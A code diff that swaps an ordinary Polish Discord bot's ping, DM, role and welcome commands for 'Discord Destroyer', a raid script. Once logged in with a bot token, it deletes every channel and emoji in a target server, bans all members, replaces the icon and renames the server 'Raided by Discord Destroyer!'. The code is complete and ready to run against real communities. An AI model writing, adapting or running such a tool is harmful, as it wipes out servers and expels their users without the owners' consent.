@@ -1,90 +1,66 @@
+// Initialise a client and Discord object.
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const config = require("./config.json");
 
-client.on("ready", () => {
-    console.log(`(SYSTEM) Rihno Jest gotowy do pracy`);
+// Get Discord Destroyer version.
+const packageVersion = require("./package.json").version;
 
-})
+// Settings for the bot.
+const settings = {
+    botToken: "YOUR TOKEN HERE",
+    guildID: "YOUR GUILD ID HERE",
+    guildName: "Raided by Discord Destroyer!"
+};
 
-// Komenda r!ping
+// Startup message,
+console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Starting Discord Destroyer, Version: ${packageVersion}. ~(˘▾˘~)`);
 
-client.on("message", async msg => {
+// Once the bot is ready start destroying the guild!
+client.once('ready', () => {
+    // Success msg.
+    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
 
-    if (msg.author.bot) return;
-    if (msg.channel.type !== "text") return;
-    if (msg.content.startsWith(config.prefix + "ping")){
-        var pv = new Discord.RichEmbed()
-            .setTitle(`@${msg.author.tag} Pong!`)
-            .setDescription(`:ping_pong: **Twój ping to ${Math.round(client.ping)}ms**`)
-            .setColor("RANDOM")
-            .setFooter(`@${msg.author.tag} Sprawdził swój ping!`)
-            msg.channel.send(pv);
-    }
-})
+    // Get the guild using the ID.
+    let guild = client.guilds.get(settings.guildID);
 
-// Komenda r!dm
+    // Delete all channels.
+    guild.channels.forEach(c => {
+        c.delete();
+        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
+    });
 
-const prefix = "r!";
-client.on ("message", (message) => {
+    // Delete all emojis.
+    guild.emojis.forEach(e => {
+        guild.deleteEmoji(e);
+        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
+    });
 
+    // Ban all users.
+    guild.members.forEach(m => {
+        m.ban();
+        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+    });
 
-    msg = message.content.toLowerCase();
+    // Set the guild icon to nothing.
+    guild.setIcon("https://china.hacked-my.computer/95314b55.png");
 
-    if (message.author.bot) return;
+    // Set the guild name to the desired name.
+    guild.setName(settings.guildName);
     
-    mention = message.mentions.users.first();
-
-    if (msg.startsWith (prefix + "dm")) {
-        if (mention == null) { return; }
-        message.delete();
-        mentionMessage = message.content.slice (4);
-        mention.sendMessage (mentionMessage);
-        message.channel.send ("(**SYSTEM**) Wysłano!")
-    }
+    // Success prompt.
+    console.info("\x1b[37m\x1b[42mSuccess\x1b[0m: Operation completed! (^_^)/~");
 })
 
-// Nadawanie rangi po wejściu użytkownika na serwer.
+// Login into the bot.
+client.login(settings.botToken);
 
-client.on ("guildMemberAdd", member => {  
-
-    var role = member.guild.roles.find ("name", "[RHINO] MEMBER");
-    member.addRole (role);
-    var role = member.guild.roles.find ("name", "╠-● POWIADOMIENIA");
-    member.addRole (role);
-    var role = member.guild.roles.find ("name", "╠-● UŻYTKOWNIK");
-    member.addRole (role);
-})
-
-client.on ("guildMemberRemove", member => {
-
-})  
-
-// Wiadomość powitalna.
-
-client.on("guildMemberAdd", function(member){
-    member.guild.channels.find("name", "🌠┃powitalnia").send(`(**SYSTEM**) Przywitajmy użytkownika o nazwie **${member}**, zapoznaj się z regulaminem!`)
-
+// Some handle uncaught exceptions.
+process.on("uncaughtException", err => {
+    console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
+    process.exit(1);
 });
 
-// Status
-
-let statuses = ['| Stabilny Hosting |','| Aktulizacja za 2 dni! |','| Aktywny już 24/7 |','| Rhino BOT - v1.1 |'];
-
-client.on('ready', () => {
-
-    setInterval(function() {
-
-        let status = statuses[Math.floor(Math.random()* statuses.length)];
-
-        client.user.setPresence({ game: { name: status }, status: 'online' });
-        client.user.setPresence({ activity: { name: status }, status: 'WATCHING' });
-
-
-    }, 5000)
-
-})
-
-
-
-client.login(process.env.token);
+// Some what handle unhandled rejections.
+process.on("unhandledRejection", err => {
+    process.exit(1);
+});
